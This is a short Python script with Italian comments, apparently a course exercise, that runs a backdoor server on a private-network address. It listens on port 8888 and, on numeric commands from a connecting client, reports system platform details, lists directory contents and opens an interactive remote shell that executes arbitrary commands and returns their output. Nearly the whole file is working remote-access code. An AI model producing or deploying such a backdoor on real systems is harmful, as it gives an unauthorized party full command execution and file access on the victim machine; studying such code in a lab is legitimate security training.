import socket  # Importa il modulo per la comunicazione tramite socket
import platform  # Importa il modulo per ottenere informazioni sul sistema operativo
import os  # Importa il modulo per interagire con il sistema operativo
import subprocess  # Importa il modulo per eseguire comandi di shell

SRV_ADDR = "192.168.90.101"  # Indirizzo IP del server
SRV_PORT = 8888  # Porta del server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Crea un oggetto socket
s.bind((SRV_ADDR, SRV_PORT))  # Collega il socket all'indirizzo IP e alla porta specificati
s.listen(1)  # Inizia ad ascoltare le connessioni in ingresso, consentendo al massimo una connessione
connection, address = s.accept()  # Accetta la connessione in entrata e restituisce il socket di connessione e l'indirizzo del client
print("Client connesso: ", address)

while True:
    try:
        data = connection.recv(1024)  # Riceve i dati dal client
    except:
        continue  # In caso di errore, continua con la prossima iterazione

    if data.decode('utf-8') == '1':
        tosend = platform.platform()  # Ottiene le informazioni sulla piattaforma del sistema
        connection.sendall(tosend.encode('utf-8'))  # Invia le informazioni al client
    elif data.decode('utf-8') == '2':
        data = connection.recv(1024)  # Riceve ulteriori dati dal client
        try:
            filelist = os.listdir(data.decode('utf-8'))  # Ottiene la lista dei file nella directory specificata
            tosend = ",".join(filelist) if filelist else "Nessun file trovato"  # Concatena i nomi dei file separati da virgola
        except:
            tosend = "Percorso errato"  # Se si verifica un errore, imposta un messaggio di errore
        connection.sendall(tosend.encode('utf-8'))  # Invia la lista dei file al client
    elif data.decode('utf-8') == '3':
        connection.sendall("Shell avviata. Inserisci comandi:".encode('utf-8'))  # Invia un messaggio di avviso al client
        while True:
            command = connection.recv(1024).decode('utf-8')  # Riceve il comando dal client
            if command.lower() == 'exit':  # Se il comando Ã¨ "exit"
                break  # Esce dal ciclo
            output = subprocess.getoutput(command)  # Esegue il comando di shell e ottiene l'output
            connection.sendall(output.encode('utf-8'))  # Invia l'output al client
    elif data.decode('utf-8') == '0':
        connection.close()  # Chiude la connessione corrente
        connection, address = s.accept()  # Accetta una nuova connessione in entrata e restituisce il socket di connessione e l'indirizzo del client